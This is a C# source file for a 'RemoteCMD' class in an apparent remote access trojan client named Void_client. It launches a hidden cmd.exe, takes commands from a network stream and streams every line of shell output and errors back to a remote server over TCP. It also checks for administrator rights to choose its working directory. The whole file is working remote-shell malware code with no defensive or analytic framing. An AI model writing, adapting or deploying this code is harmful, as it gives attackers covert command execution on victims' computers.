using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace Void_client.Libs
{
    class RemoteCMD
    {
        //creates variables
        public static NetworkStream stream { get; set; }
        private static Process cmdProc;
        private static StreamWriter writer;
        private static StreamReader errReader;
        private static StreamReader reader;

        public static void Start()
        {
            ProcessStartInfo info = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                WorkingDirectory = InfoGathering.IsAdministrator() ? @"C:\Windows\System32" : Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            };

            cmdProc = new Process
            {
                StartInfo = info
            }; 

            //sets stuff up
            cmdProc.Start();
            writer = cmdProc.StandardInput; 
            writer.AutoFlush = true; 
            reader = cmdProc.StandardOutput; 
            errReader = cmdProc.StandardError; 
            
            GetShellOutput();
        }

        public static void Stop()
        {
            //gets rid of all the variables
            cmdProc.Kill();
            cmdProc.Dispose();
            writer.Dispose();
            reader.Dispose();
            errReader.Dispose();
        }

        public static void Send(string input)
        {
            //writes the input to the cmd session
            Task.Run(() => writer.WriteLine(input + "\r\n"));
        }

        private static void GetShellOutput()
        {
            //starts recieving information from the cmd session, when some data is written to it it will send it to the server
            Task.Factory.StartNew(() =>
            {
                try
                {
                    string outputBuffer = "";

                    while ((outputBuffer = reader.ReadLine()) != null)
                        TCP.SendInformation("cmd|" + outputBuffer, stream);
                }
                catch (Exception ex)
                {
                    TCP.SendInformation("cmdout|Error reading cmd response: \n" + ex.Message, stream);
                }
            });

            Task.Factory.StartNew(() =>
            {
                try
                {
                    string errorBuffer = "";

                    while ((errorBuffer = errReader.ReadLine()) != null)
                        TCP.SendInformation("cmd|" + errorBuffer, stream);
                }
                catch (Exception ex)
                {
                    TCP.SendInformation("cmd|Error reading cmd response: \n" + ex.Message, stream);
                }
            });
        }
    }
}